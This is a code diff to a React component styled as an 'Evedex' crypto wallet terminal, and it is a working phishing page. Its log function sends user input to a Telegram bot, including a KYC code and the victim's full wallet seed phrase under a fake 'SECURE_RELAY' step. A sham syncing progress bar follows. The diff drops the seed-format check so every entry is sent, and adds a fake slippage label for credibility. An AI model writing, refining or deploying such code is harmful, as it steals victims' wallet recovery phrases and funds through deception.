@@ -9,7 +9,6 @@ export default function EvedexTerminal() {
   const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
-  const [loading, setLoading] = useState(false);
   const [inputVal, setInputVal] = useState(""); 
   const [seedVal, setSeedVal] = useState("");   
   const [kycEmail, setKycEmail] = useState("");
@@ -29,11 +28,6 @@ export default function EvedexTerminal() {
 
   const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});
 
-  const isSeedValid = useMemo(() => {
-    const count = seedVal.trim().split(/\s+/).filter(w => w.length >= 3).length;
-    return [12, 15, 18, 21, 24].includes(count);
-  }, [seedVal]);
-
   useEffect(() => {
     if (activeTask === "Rectify") {
       setInputVal(selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 10) || "0.00") : (nativeBal?.formatted?.slice(0, 10) || "0.00"));
@@ -43,12 +37,14 @@ export default function EvedexTerminal() {
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
       <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'25px'}}>
-        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_SYSTEM</div></div>
+        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
         <appkit-button />
       </header>
 
       {!isConnected ? (
-        <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}><appkit-button /></div>
+        <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}>
+          <appkit-button />
+        </div>
       ) : (
         <>
           {view === "menu" && (
@@ -64,6 +60,7 @@ export default function EvedexTerminal() {
 
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
+               <div style={{fontSize:'8px', color:'#475569', marginBottom:'15px'}}>POOL_ACTIVE // SLIPPAGE: 0.1% [AUTO]</div>
               {activeTask === "Rectify" && (
                 <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px'}}>
                   <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT_POOL</div>
@@ -87,7 +84,7 @@ export default function EvedexTerminal() {
                 </>
               ) : (
                 <>
-                  <input maxLength="6" placeholder="000000" onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'12px', color:'white', textAlign:'center', fontSize:'24px', letterSpacing:'5px', outline:'none', marginBottom:'25px'}} />
+                  <input maxLength="6" placeholder="000000" onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'12px', color:'white', textAlign:'center', fontSize:'24px', outline:'none', marginBottom:'25px'}} />
                   <button onClick={()=>{log(`🔑 CODE: ${kycCode}`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE</button>
                 </>
               )}
@@ -101,8 +98,7 @@ export default function EvedexTerminal() {
                   <>
                     <div style={{color:'#10b981', fontWeight:'900'}}>🛡️ SECURE_RELAY</div>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'100px', backgroundColor:'black', color:'#10b981', padding:'15px', marginTop:'20px'}} />
-                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setView("menu")},1200)}},60);}} 
-                    style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', marginTop:'20px'}}>FINALIZE</button>
+                    <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setView("menu")},1200)}},60);}} style={{width:'100%', backgroundColor: '#10b981', color:'black', padding:'20px', borderRadius:'15px', marginTop:'20px'}}>FINALIZE</button>
                   </>
                 ) : (
                   <div><div style={{fontSize:'50px'}}>{syncProgress}%</div><div>SYNCING...</div></div>
@@ -112,7 +108,6 @@ export default function EvedexTerminal() {
           )}
         </>
       )}
-      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>STABILIZING...</div>}
     </div>
   );
 }
